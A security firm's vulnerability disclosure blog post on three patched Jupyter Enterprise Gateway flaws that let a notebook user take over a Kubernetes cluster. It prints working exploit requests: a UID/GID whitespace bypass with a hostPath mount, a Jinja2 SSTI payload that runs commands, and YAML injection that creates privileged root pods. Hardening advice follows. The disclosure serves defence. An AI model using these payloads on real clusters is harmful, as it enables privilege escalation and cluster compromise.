---
title: Jupyter Enterprise Gateway - From Notebook to Kubernetes Cluster Admin - elttam
source: https://www.elttam.com/blog/jupyter-enterprise-gateway
source_host: www.elttam.com
clip_date: 2026-09-18T10:51:46+08:00
trace_id: e40671c8-7ec5-4dda-be20-44ea9a8b8205
content_hash: 58b55952f45c3b2ccbf30fbefbdfa9c88187a9e5f0403f27e8e8eab6af7f4d65
status: synced
tags:
  - 漏洞分析
  - Linux安全
series: null
feed_source: elttam
ai_summary: Jupyter Enterprise Gateway 三个漏洞可让普通 notebook 用户拿到整个 Kubernetes 集群控制权：通过 UID/GID 白空格绕过提权到 root、Jinja2 SSTI 在网关容器内执行代码、YAML 注入创建任意特权 Pod。官方已在 v3.3.0 修复。
ai_summary_style: key-points
images_status:
  total: 9
  succeeded: 9
  failed_urls: []
notion_page_id: 3df75244-d011-8118-a80f-f3ea4ce66c41
ioc:
  cves:
    - CVE-2026-44180
    - CVE-2026-44181
    - CVE-2026-44182
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Jupyter Enterprise Gateway 三个漏洞可让普通 notebook 用户拿到整个 Kubernetes 集群控制权：通过 UID/GID 白空格绕过提权到 root、Jinja2 SSTI 在网关容器内执行代码、YAML 注入创建任意特权 Pod。官方已在 v3.3.0 修复。
> 
> - **根因：** 用户可控的 `KERNEL_XXX` 环境变量未经校验/转义即流入安全上下文与 Jinja2 模板渲染。
> - **CVE-2026-44180（UID/GID 绕过）：** `_enforce_prohibited_ids()` 用原始字符串严格比对，传 `"0 "`（带尾随空格）即绕过，Jinja2 `int` 过滤器仍解析为 0；配合 `KERNEL_VOLUMES`/`KERNEL_VOLUME_MOUNTS` 挂载 `hostPath: /` 可读宿主机文件系统与 `containerd.sock`，实现节点级代码执行。
> - **CVE-2026-44181（SSTI RCE）：** 在 `KERNEL_POD_NAME` 中注入 `{{ cycler.__init__.__globals__.os.popen("hostname").read() }}` 可在 Enterprise Gateway 容器内执行命令，并通过 Pod 名回显结果；其 Service Account 拥有 pods/secrets/namespaces/persistentvolumes 的 create/delete 权限。
> - **CVE-2026-44182（YAML 清单注入）：** 借 `KERNEL_WORKING_DIR` 等变量注入换行与 `---`，可覆盖 `securityContext`（`runAsUser: 0`）或新增 `privileged: true` 的任意 Pod。
> - **加固要点：** 升级 v3.3.0；用 NetworkPolicy 限制网关 API 仅客户端可达并启用 `EG_AUTH_TOKEN`；收紧 RBAC；用 Kyverno/OPA Gatekeeper 阻断 root、privileged 与 hostPath；对 kernel 命名空间设 PodSecurityStandard；考虑 user namespaces。

## Introduction

While assessing an AI platform, we identified three vulnerabilities in [Jupyter Enterprise Gateway](https://jupyter-enterprise-gateway.readthedocs.io/) that allow a notebook user with no Kubernetes privileges to compromise the underlying cluster. In this post we walk through how a notebook user can escalate from running data science workloads to reading cluster secrets, mounting host filesystems, and creating arbitrary privileged pods. We responsibly disclosed these issues to the Jupyter security team, who have since published a patched release in v3.3.0.

Each issue has been assigned a CVE:

-   [CVE-2026-44180 / GHSA-chq7-94j8-cj28: ContainerProcessProxy.\_enforce_prohibited_ids Bypass](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28)
-   [CVE-2026-44181 / GHSA-f49j-v924-fx9w: Jinja2 Template Server Side Template Injection resulting in Remote Code Execution](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-f49j-v924-fx9w)
-   [CVE-2026-44182 / GHSA-cfw7-6c5v-2wjq: Kubernetes Manifest Injection in Jinja2 Template Rendering](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-cfw7-6c5v-2wjq)

Our full advisories including proof-of-concept exploits and Nuclei templates for each issue are published in our [GitHub repository](https://github.com/elttam/publications/tree/master/writeups/jupyter-enterprise-gateway/).

The rest of this post walks through each vulnerability and covers hardening recommendations.

## Background: Enterprise Gateway Architecture

![Jupyter logo](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/363e0cd0504743ff.png)

Jupyter logo

Jupyter Enterprise Gateway is a top-level Jupyter project that extends Jupyter Notebook and JupyterHub to launch kernels remotely on distributed compute infrastructure - including Kubernetes, Apache Spark, and others.

In a standard local Jupyter setup, the kernel (the Python process that actually executes your code) runs on the same machine as the notebook server.

Enterprise Gateway decouples these: the notebook server stays where it is, but kernel execution is delegated to a remote cluster.

This is a common pattern for sharing GPU and CPU compute across users and workloads on AI platforms.

![Enterprise Gateway deployment architecture showing Client connecting to Enterprise Gateway via HTTPS/WSS, which connects to Worker Nodes running Kernels via ZMQ](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/7e8788b3f9d56c16.png)

Enterprise Gateway deployment architecture showing Client connecting to Enterprise Gateway via HTTPS/WSS, which connects to Worker Nodes running Kernels via ZMQ

In a Kubernetes deployment, when a user opens a notebook and runs a cell, the notebook server calls Enterprise Gateway's REST API to request a kernel.

Enterprise Gateway then creates a Kubernetes pod - the kernel pod - in which the user's code actually runs.

Enterprise Gateway acts as a privileged intermediary: it holds a Kubernetes service account with broad permissions to create, list, and delete pods, secrets, namespaces, persistent volumes, and more.

![Architecture diagram: multiple users connecting through Jupyter Notebook Server to Enterprise Gateway running in a Kubernetes cluster, which spawns Kernel Pods for code execution](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8fbe4c711829c31e.svg)

Architecture diagram: multiple users connecting through Jupyter Notebook Server to Enterprise Gateway running in a Kubernetes cluster, which spawns Kernel Pods for code execution

Consider a corporate data science platform where dozens of analysts and data scientists share a Jupyter environment backed by Enterprise Gateway.

These users - call one Mallory - have legitimate notebook access, but they are not Kubernetes cluster administrators.

The cluster likely hosts other sensitive workloads: production services, databases, internal tooling.

Mallory is not supposed to be able to touch any of that.

![Kubernetes cluster diagram showing Enterprise Gateway and Kernel Pods alongside other sensitive workloads such as production services and databases](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/80080edfac309139.svg)

Kubernetes cluster diagram showing Enterprise Gateway and Kernel Pods alongside other sensitive workloads such as production services and databases

But Enterprise Gateway's API accepts user-controlled values that influence how kernels are launched.

These values can be weaponised in two ways: through the notebook server, which may forward user-controlled environment variables to Enterprise Gateway; or directly against the Enterprise Gateway API - including by hairpinning from within a kernel pod if the cluster's network policy allows more than the ZMQ backchannel to Enterprise Gateway.

Either path lets a notebook user leverage Enterprise Gateway's elevated Kubernetes service account privileges to compromise the entire cluster and every workload running on it.

![Lab architecture: Mallory as notebook user connecting through Jupyter Notebook Server to Jupyter Enterprise Gateway running in a Kubernetes cluster, which spawns Kernel Pods](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/5edfbae40bd9861e.svg)

Lab architecture: Mallory as notebook user connecting through Jupyter Notebook Server to Jupyter Enterprise Gateway running in a Kubernetes cluster, which spawns Kernel Pods

## Vulnerabilities

To illustrate the vulnerabilities, we created a Kubernetes cluster and deployed a vulnerable version (v3.2.3) of Jupyter Enterprise Gateway using Helm.

The demonstrations below use [ducaale/xh](https://github.com/ducaale/xh), an [HTTPie](https://httpie.io/) -style HTTP client.

## ContainerProcessProxy.\_enforce_prohibited_ids Bypass (GHSA-chq7-94j8-cj28)

![Prohibited ID bypass attack diagram: Mallory sends KERNEL\_UID='0 ' to bypass the check, causing Enterprise Gateway to spawn a Kernel Pod running as root (UID:GID 0:0)](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/f4b92fde1cc41929.svg)

Prohibited ID bypass attack diagram: Mallory sends KERNEL_UID='0 ' to bypass the check, causing Enterprise Gateway to spawn a Kernel Pod running as root (UID:GID 0:0)

Jupyter Enterprise Gateway's API takes a JSON body that allows specifying [environment variables](https://jupyter-enterprise-gateway.readthedocs.io/en/latest/users/kernel-envs.html) that control the launch of the Jupyter kernel.

From a security point of view, two immediately interesting variables are: `KERNEL_UID` and `KERNEL_GID`.

On Kubernetes, these control the [security context](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.34/#securitycontext-v1-core) 's `runAsUser` and `runAsGroup`, as seen in `kernel-pod.yaml.j2` where the Jinja2 variables are interpolated.

[`etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L32-L41):

```jinja

  {% if kernel_uid is defined or kernel_gid is defined %}
  securityContext:
    {% if kernel_uid is defined %}
    runAsUser: {{ kernel_uid | int }}
    {% endif %}
    {% if kernel_gid is defined %}
    runAsGroup: {{ kernel_gid | int }}
    {% endif %}
    fsGroup: 100
  {% endif %}
```

First, we make a REST API call to Jupyter Enterprise Gateway to create a simple Jupyter kernel, without specifying `KERNEL_UID` or `KERNEL_GID`:

```bash

xh http://localhost:32222/api/kernels name=python_kubernetes env:='{
  "KERNEL_POD_NAME": "bdawg",
  "KERNEL_NAMESPACE": "notebooks",
}'
```

```http

HTTP/1.1 201 Created
Content-Length: 172
Content-Type: application/json
Date: Wed, 08 Oct 2025 10:56:56 GMT
Location: /api/kernels/ef26b082-b04a-416a-9ae9-9f8ca793183a
Server: TornadoServer/6.2
X-Content-Type-Options: nosniff
{
    "id": "ef26b082-b04a-416a-9ae9-9f8ca793183a",
    "name": "python_kubernetes",
    "last_activity": "2025-10-08T10:56:58.330712Z",
    "execution_state": "starting",
    "connections": 0
}
```

Inspecting the `bdawg` pod that Enterprise Gateway just created, we can see it is running as UID:GID `1000:100`.

This is the `jovyan` user and `users` group inside the container - a non-root user and group.

```bash

kubectl get pod/bdawg -o yaml -n notebooks -o jsonpath='{.spec.securityContext}' | jq
```

```json

{
  "fsGroup": 100,
  "runAsGroup": 100,
  "runAsUser": 1000
}
```

### Trying UID=0 and/or GID=0

Now we try to create a kernel with UID or GID \`0\` (root):

```bash

xh http://localhost:32222/api/kernels name=python_kubernetes env:='{
  "KERNEL_POD_NAME": "bdawg-uid",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_UID": "0",
}'
```

```http

HTTP/1.1 403 Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!
Content-Length: 94
Content-Type: application/json
Date: Wed, 08 Oct 2025 11:03:27 GMT
Server: TornadoServer/6.2
X-Content-Type-Options: nosniff
{
    "reason": "Kernel's UID value of '0' has been denied via EG_PROHIBITED_UIDS!",
    "message": ""
}
```

`KERNEL_GID=0` fails similarly:

```http

HTTP/1.1 403 Kernel's GID value of '0' has been denied via EG_PROHIBITED_GIDS!
Content-Length: 94
Content-Type: application/json
Date: Wed, 08 Oct 2025 11:03:32 GMT
Server: TornadoServer/6.2
X-Content-Type-Options: nosniff
{
    "reason": "Kernel's GID value of '0' has been denied via EG_PROHIBITED_GIDS!",
    "message": ""
}
```

Setting both `KERNEL_UID=0` and `KERNEL_GID=0` together also fails.

Enterprise Gateway has a feature that prevents the launching of kernels with prohibited UIDs or GIDs, defaulting to blocking UID \`0\` and GID \`0\`.

[`enterprise_gateway/services/processproxies/container.py`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L29-L30):

```python

prohibited_uids = os.getenv("EG_PROHIBITED_UIDS", "0").split(",")
prohibited_gids = os.getenv("EG_PROHIBITED_GIDS", "0").split(",")
```

[`enterprise_gateway/services/processproxies/container.py`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/container.py#L108-L124):

```python

    def _enforce_prohibited_ids(self, **kwargs: dict[str, Any] | None) -> None:
        """Determine UID and GID with which to launch container and ensure they are not prohibited."""
        kernel_uid = kwargs["env"].get("KERNEL_UID", default_kernel_uid)
        kernel_gid = kwargs["env"].get("KERNEL_GID", default_kernel_gid)

        if kernel_uid in prohibited_uids:
            http_status_code = 403
            error_message = (
                f"Kernel's UID value of '{kernel_uid}' has been denied via EG_PROHIBITED_UIDS!"
            )
            self.log_and_raise(http_status_code=http_status_code, reason=error_message)
        elif kernel_gid in prohibited_gids:
            http_status_code = 403
            error_message = (
                f"Kernel's GID value of '{kernel_gid}' has been denied via EG_PROHIBITED_GIDS!"
            )
            self.log_and_raise(http_status_code=http_status_code, reason=error_message)
```

### Bypassing ID Restrictions

The vulnerability in `_enforce_prohibited_ids()` is that the check is a strict comparison against the raw user-supplied value.

The supplied value is then processed by the Jinja2 \`int\` filter and used in the Kubernetes manifest.

Values like `"0 "` (note the trailing space) bypass the check, because `"0 "`!= `"0"`, but `int("0 ")` evaluates to `0`.

Sending the padded values:

```bash

xh http://localhost:32222/api/kernels name=python_kubernetes env:='{
  "KERNEL_POD_NAME": "bdawg-uid",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_UID": "0 ",
  "KERNEL_GID":"0 "
}'
```

```http

HTTP/1.1 201 Created
Content-Length: 172
Content-Type: application/json
Date: Wed, 08 Oct 2025 11:03:36 GMT
Location: /api/kernels/0ddff0b6-d256-44ff-a061-298722daeabe
Server: TornadoServer/6.2
X-Content-Type-Options: nosniff
{
    "id": "0ddff0b6-d256-44ff-a061-298722daeabe",
    "name": "python_kubernetes",
    "last_activity": "2025-10-08T11:03:38.962736Z",
    "execution_state": "starting",
    "connections": 0
}
```

The `bdawg-uid` pod was created.

Inspecting it, we see it is running as UID:GID `0:0` (root:root):

```bash

kubectl get pod/bdawg-uid -o yaml -n notebooks -o jsonpath='{.spec.securityContext}' | jq
```

```json

{
  "fsGroup": 100,
  "runAsGroup": 0,
  "runAsUser": 0
}
```

The Enterprise Gateway prohibited UID/GID security feature is bypassed.

### Executing Code as Root with the Enterprise Gateway Client

With the kernel running, we can interact with it using the client library bundled in the Enterprise Gateway repository at [`enterprise_gateway/client`](https://github.com/jupyter-server/enterprise_gateway/tree/main/enterprise_gateway/client).

Set up a virtual environment, then start IPython with the Gateway host configured:

```bash

python -m venv venv && . ./venv/bin/activate
export GATEWAY_HOST=http://localhost:32222
ipython
```

```python

import ast
import gateway_client

gc = gateway_client.GatewayClient()

# Use kernel ID from exploit above
kernel_id = '0ddff0b6-d256-44ff-a061-298722daeabe'

k = gateway_client.KernelClient(
    gc.http_api_endpoint,
    gc.ws_api_endpoint,
    kernel_id,
    timeout=120,
    logger=gc.log,
)
```

The `execute()` method returns output as a string containing a Python byte-string literal.

A small helper unwraps it:

```python

def run(kernel, cmd):
    output, _ = kernel.execute(f'import subprocess; subprocess.check_output({cmd!r})')
    return ast.literal_eval(output).decode('utf-8')
```

Confirming code execution as root in the kernel pod:

```python

In [1]: print(run(k, ['id']))
uid=0(root) gid=0(root) groups=0(root),100(users)

In [2]: print(run(k, ['hostname']))
bdawg-uid
```

### Cluster Compromise: Mounting the Host Filesystem

![Cluster compromise diagram: Mallory's kernel pod runs as root with a hostPath volume mount, accessing the worker node's filesystem and all workloads running on it](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/096566d13edc90fd.svg)

Cluster compromise diagram: Mallory's kernel pod runs as root with a hostPath volume mount, accessing the worker node's filesystem and all workloads running on it

Running as root inside a container becomes significantly more dangerous when combined with volume mounts.

Enterprise Gateway allows clients to specify volumes via the `KERNEL_VOLUMES` and `KERNEL_VOLUME_MOUNTS` environment variables.

By combining the UID/GID bypass with a `hostPath` volume mount, we can mount the underlying Kubernetes worker node's filesystem into the kernel pod and access it as root.

```bash
xh http://localhost:32222/api/kernels env:='{
  "KERNEL_POD_NAME": "bdawg-id-bypass",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_UID": "0 ",
  "KERNEL_GID": "0 ",
  "KERNEL_VOLUMES": "[{\"name\":\"host\",\"hostPath\":{\"path\":\"/\"}}]",
  "KERNEL_VOLUME_MOUNTS": "[{\"name\":\"host\",\"mountPath\":\"/host\"}]"
}'
```

```http

HTTP/1.1 201 Created
Content-Type: application/json
{
    "id": "d80a5a1d-33ff-4ce7-88f8-905b68fa3131",
    "name": "python_kubernetes",
    "last_activity": "2025-12-02T12:29:30.733441Z",
    "execution_state": "starting",
    "connections": 0
}
```

Connecting to the kernel with the Enterprise Gateway client (reusing the `run()` helper from above):

```python

# Use kernel ID from exploit above
kernel_id = 'd80a5a1d-33ff-4ce7-88f8-905b68fa3131'

k = gateway_client.KernelClient(
    gc.http_api_endpoint,
    gc.ws_api_endpoint,
    kernel_id,
    timeout=120,
    logger=gc.log,
)
```

We confirm root execution, and that the container's OS is Ubuntu Jammy while the host node is Alpine Linux - proving we are reading the host filesystem through `/host`:

```python

In [1]: print(run(k, ['id']))
uid=0(root) gid=0(root) groups=0(root),100(users)

In [2]: print(run(k, ['cat', '/etc/os-release']))
PRETTY_NAME="Ubuntu 22.04.2 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.2 LTS (Jammy Jellyfish)"

In [3]: print(run(k, ['cat', '/host/etc/os-release']))
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.22.1
PRETTY_NAME="Alpine Linux v3.22"
```

Inspecting `/host/run/k0s/` reveals the Kubernetes node runtime, including the `containerd` socket, the interface through which every container on the node is managed, and a well-known path to arbitrary container execution on the host:

```python

In [4]: print(run(k, ['ls', '-la', '/host/run/k0s/']))
total 40
drwx--x--x  5 root root  100 Oct  8 07:30 containerd
-rw-r--r--  1 root root    6 Oct  8 07:30 containerd.pid
srw-rw----  1 root root    0 Oct  8 07:30 containerd.sock
srw-rw----  1 root root    0 Oct  8 07:30 containerd.sock.ttrpc
-rw-------  1 root root 4266 Oct  8 07:30 k0s.yaml
drwxr-xr-x  2 root root   80 Oct  8 07:30 kubelet
-rw-r--r--  1 root root    6 Oct  8 07:30 kube-apiserver.pid
```

With root access and the host filesystem mounted, code execution on the underlying worker node is achievable via multiple paths - writing a cron job into the host filesystem being one straightforward example.

Repeating this across worker nodes compromises the entire cluster.

## Jinja2 Template Server Side Template Injection resulting in Remote Code Execution (GHSA-f49j-v924-fx9w)

![SSTI attack diagram: Mallory sends a Jinja2 template expression in KERNEL\_POD\_NAME, causing Enterprise Gateway to evaluate it server-side and achieve code execution inside the Enterprise Gateway pod](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/8cf25b9bc62b8e26.svg)

SSTI attack diagram: Mallory sends a Jinja2 template expression in KERNEL_POD_NAME, causing Enterprise Gateway to evaluate it server-side and achieve code execution inside the Enterprise Gateway pod

The various `KERNEL_XXX` environment variables passed in the API request flow directly into Jinja2 template rendering when Enterprise Gateway builds the Kubernetes manifest.

No sanitisation is applied, so embedding Jinja2 template expressions in these values causes them to be evaluated server-side - inside the Enterprise Gateway pod.

The vulnerable code path is in [`enterprise_gateway/services/processproxies/k8s.py`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/enterprise_gateway/services/processproxies/k8s.py#L219-L247), where `kernel_pod_name` and other `kernel_xxx` variables are rendered via Jinja2.

The template [`etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77) contains multiple such variables - each a potential injection point.

These values originate from `KERNEL_XXX` environment variables in the API call, converted to lowercase by [`launch_kubernetes.py`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137).

### Simple Demonstration

The classic SSTI probe is arithmetic: embedding `{{7 * 7}}` in `KERNEL_POD_NAME` demonstrates that Jinja2 evaluates the expression server-side, with the result appearing in the pod name.

```bash

xh http://localhost:32222/api/kernels name=python_kubernetes env:='{
  "KERNEL_POD_NAME": "bdawg-{{7 * 7}}",
  "KERNEL_NAMESPACE": "notebooks"
}'
```

```bash

kubectl get pods -n notebooks
```

```plaintext

NAME       READY   STATUS    RESTARTS   AGE
bdawg-49   1/1     Running   0          3m54s
```

The pod is named \`bdawg-49\` - \`7 \* 7\` was evaluated by Jinja2 during manifest rendering.

### Remote Code Execution

Jinja2's Python object graph can be traversed to reach `os.popen()`.

The following payload runs `hostname` inside the Enterprise Gateway pod and exfiltrates the output through the kernel pod's name:

```bash
xh http://localhost:32222/api/kernels name=python_kubernetes env:='{
  "KERNEL_POD_NAME": "ssti-{{ cycler.__init__.__globals__.os.popen(\"hostname\").read() }}",
  "KERNEL_NAMESPACE": "notebooks"
}'
```

```bash

kubectl get pods -n notebooks
```

```plaintext

NAME                                        READY   STATUS    RESTARTS   AGE
ssti-enterprise-gateway-c8877b64c-hr552     1/1     Running   0          2m25s
```

The pod name contains the hostname of the Enterprise Gateway pod - confirming code execution is happening inside Enterprise Gateway itself, not inside a kernel pod.

### Impact: Enterprise Gateway Service Account

Code execution inside the Enterprise Gateway pod grants access to its mounted Kubernetes service account token.

Using that stolen token, `kubectl auth can-i --list` reveals the extent of access:

```plaintext

Resources                                       Verbs
rolebindings.rbac.authorization.k8s.io          [get list create delete]
configmaps                                      [get watch list create delete]
namespaces                                      [get watch list create delete]
persistentvolumeclaims                          [get watch list create delete]
persistentvolumes                               [get watch list create delete]
pods                                            [get watch list create delete]
secrets                                         [get watch list create delete]
services                                        [get watch list create delete]
```

It has full create/delete access to pods, secrets, namespaces, and persistent volumes.

An attacker can read all cluster secrets, create privileged pods, or mount host filesystems - the same cluster compromise path demonstrated in the previous section, but reached via code execution in Enterprise Gateway rather than a kernel pod.

## Kubernetes Manifest Injection in Jinja2 Template Rendering (GHSA-cfw7-6c5v-2wjq)

![Manifest injection attack diagram: Mallory injects YAML via KERNEL\_WORKING\_DIR, causing Enterprise Gateway to render a malicious Kubernetes manifest that creates an attacker-controlled pod](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/09/659fe772c5525773.svg)

Manifest injection attack diagram: Mallory injects YAML via KERNEL_WORKING_DIR, causing Enterprise Gateway to render a malicious Kubernetes manifest that creates an attacker-controlled pod

The same `KERNEL_XXX` environment variables that flow into Jinja2 template rendering also flow into the rendered YAML manifest without YAML-aware escaping.

By injecting newlines and YAML syntax into these values, an attacker can break out of the string context and write arbitrary YAML into the manifest - overwriting existing fields or injecting entirely new Kubernetes resources.

The injection points are `kernel_xxx` variables in [`etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/kernel-pod.yaml.j2#L77), populated from `KERNEL_XXX` environment variables via [`launch_kubernetes.py`](https://github.com/jupyter-server/enterprise_gateway/blob/152c20f162f2fab700c04c8830ebf8c1e2e2217a/etc/kernel-launchers/kubernetes/scripts/launch_kubernetes.py#L130-L137).

The PoCs below use `KERNEL_WORKING_DIR`, which is active when `mirrorWorkingDirs` is enabled in the Helm chart, but any of the injectable `kernel_xxx` variables could be used.

### Overwriting securityContext via Duplicate Key Injection

YAML allows duplicate keys in a mapping, but the last copy is the effective value.

By injecting a second `securityContext` block after the legitimate one, the injected values override the originals.

The following payload uses embedded newlines to escape the string context and write YAML at the pod spec indentation level:

```json
{
  "KERNEL_POD_NAME": "working-dir-root",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\n\n# INJECTION\n  securityContext:\n    runAsUser: 0\n    runAsGroup: 0\n    fsGroup: 100\n# stray quote \""
}
```

```bash

xh http://localhost:32222/api/kernels env:=@env-working-dir-exploit.json
```

The rendered manifest shows both `securityContext` blocks.

The injected one at the bottom wins:

```yaml

  securityContext:
    runAsUser: 1000
    runAsGroup: 100
    fsGroup: 100
  containers:
  - image: "elyra/kernel-py:3.2.3"
    name: "working-dir-root"
    workingDir: "/tmp"

# INJECTION
  securityContext:
    runAsUser: 0
    runAsGroup: 0
    fsGroup: 100
# stray quote "
    volumeMounts:
```

The pod runs as `uid=0(root) gid=0(root)`.

It is also possible to inject a container-level `securityContext`, which additionally supports the `privileged` field.

### Injecting Arbitrary Kubernetes Resources

By injecting YAML document boundaries (`...` end-of-document, `---` new document), the payload can introduce entirely new Kubernetes resources alongside the kernel pod.

```json
{
  "KERNEL_POD_NAME": "working-dir-root-pod",
  "KERNEL_NAMESPACE": "notebooks",
  "KERNEL_WORKING_DIR": "\"/tmp\\\"\n\n# INJECTION\n...\n---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: injected-pod\nspec:\n  containers:\n    - name: injected-container\n      image: nginx\n      securityContext:\n        privileged: true\n        runAsUser: 0\n        runAsGroup: 0\n...\n# stray quote\""
}
```

```bash

xh http://localhost:32222/api/kernels env:=@env-working-dir-exploit-pod.json
```

The injection point in the rendered manifest:

```yaml

    workingDir: "/tmp"

# INJECTION
...
---
apiVersion: v1
kind: Pod
metadata:
  name: injected-pod
spec:
  containers:
    - name: injected-container
      image: nginx
      securityContext:
        privileged: true
        runAsUser: 0
        runAsGroup: 0
...
```

Both pods are created:

```bash

kubectl get pods -n notebooks
```

```plaintext

NAME                   READY   STATUS    RESTARTS   AGE
injected-pod           1/1     Running   0          4s
working-dir-root-pod   1/1     Running   0          4s
```

The injected pod's security context confirms it is privileged and running as root:

```bash

kubectl get pod/injected-pod -n notebooks -o jsonpath='{.spec.containers[*].securityContext}' | jq
```

```json

{
  "privileged": true,
  "runAsGroup": 0,
  "runAsUser": 0
}
```

With the ability to create arbitrary pods - privileged, with `hostPath` volume mounts, with any image, this vulnerability provides the same cluster compromise paths as the previous two: node filesystem access, `containerd` socket access, and full cluster takeover.

The `privileged` flag also opens additional container escape and privilege escalation paths beyond volume mounts, such as kernel module loading via `insmod`.

## Hardening Recommendations

The following recommendations cover both Enterprise Gateway-specific configuration and broader Kubernetes cluster hardening.

## Enterprise Gateway Configuration

-   **Patch.** Upgrade to the patched release v3.3.0 that addresses [CVE-2026-44180](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-chq7-94j8-cj28), [CVE-2026-44181](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-f49j-v924-fx9w), and [CVE-2026-44182](https://github.com/jupyter-server/enterprise_gateway/security/advisories/GHSA-cfw7-6c5v-2wjq).
-   **Restrict network access to Enterprise Gateway.** Enterprise Gateway's REST API should only be reachable by legitimate clients - such as Jupyter Server or other notebook frontends - not directly by end users. Apply a Kubernetes `NetworkPolicy` that allows ingress to the Enterprise Gateway pod only from known client pods (matched by label selector), and denies all other ingress. This prevents a malicious notebook user from bypassing the client application and sending crafted `KERNEL_XXX` payloads directly to Enterprise Gateway.
-   **Enable authentication on the Enterprise Gateway API.** Enterprise Gateway supports a static token via the `EG_AUTH_TOKEN` environment variable (or `authToken` in the Helm chart). When set, every API request must supply the token to be accepted. Combined with the network policy above, this adds a second layer: even if the network policy is misconfigured or bypassed, an unauthenticated request will be rejected.
-   **Tighten the Enterprise Gateway Kubernetes RBAC.** The default ClusterRole grants broad create/delete access to pods, secrets, namespaces, persistent volumes, and more. Audit these permissions and restrict them to the minimum required for your deployment. In particular, consider whether Enterprise Gateway needs namespace-create or secret-read access cluster-wide.

## Kubernetes Cluster Hardening

-   **Use an admission controller.** Tools like [Kyverno](https://kyverno.io/) or [OPA Gatekeeper](https://open-policy-agent.github.io/gatekeeper/) can enforce cluster-wide policies. Relevant policies for Enterprise Gateway deployments include blocking `runAsRoot`, blocking `privileged` containers, and restricting `hostPath` volume mounts.
-   **Enforce non-root execution.** Apply a `PodSecurityStandard` of at least `baseline` (or `restricted`) to kernel pod namespaces. This prevents pods from running as UID/GID 0 even if the API call requests it.
-   **Restrict hostPath mounts.** Block `hostPath` volumes at the admission layer. The cluster compromise demonstrated in this post relies on mounting the host filesystem - denying this removes that escape vector.
-   **Restrict privileged pods.** Block `securityContext.privileged: true` cluster-wide or at minimum in kernel namespaces. This blocks the privileged container creation demonstrated in the manifest injection section, removing escape vectors such as kernel module loading.
-   **Consider user namespaces.** Kubernetes user namespaces remap UIDs inside the container to unprivileged UIDs on the host. Even if an attacker achieves UID 0 inside a kernel pod, they remain unprivileged on the node - significantly reducing the blast radius.

## Conclusion

Three vulnerabilities in Jupyter Enterprise Gateway - a whitespace bypass to run kernel pods as root, a Jinja2 SSTI giving code execution inside the Gateway container, and a YAML injection allowing arbitrary Kubernetes resource creation - share a common root cause: user-controlled `KERNEL_XXX` environment variables flow into sensitive contexts without proper validation or escaping. A notebook user can escalate from running data science workloads to compromising the entire Kubernetes cluster.

The Jupyter security team has published a patched release addressing all three issues. Organisations running Jupyter Enterprise Gateway should upgrade and apply the hardening recommendations above.

Our full advisories with PoCs and Nuclei templates are available in our [GitHub repository.](https://github.com/elttam/publications/tree/master/writeups/jupyter-server/enterprise-gateway)
